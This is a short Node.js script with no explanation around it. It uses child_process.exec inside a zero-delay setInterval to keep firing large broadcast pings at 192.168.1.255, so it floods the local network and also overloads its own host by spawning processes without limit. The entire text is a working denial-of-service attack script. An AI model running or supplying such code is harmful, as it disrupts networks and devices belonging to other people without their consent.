import{exec}from'child_process';
setInterval(()=>{exec('ping -b -s 1400 192.168.1.255');exec('ping -b -s 1400 192.168.1.255');exec('ping -b -s 1400 192.168.1.255');exec('ping -b -s 1400 192.168.1.255');},0);
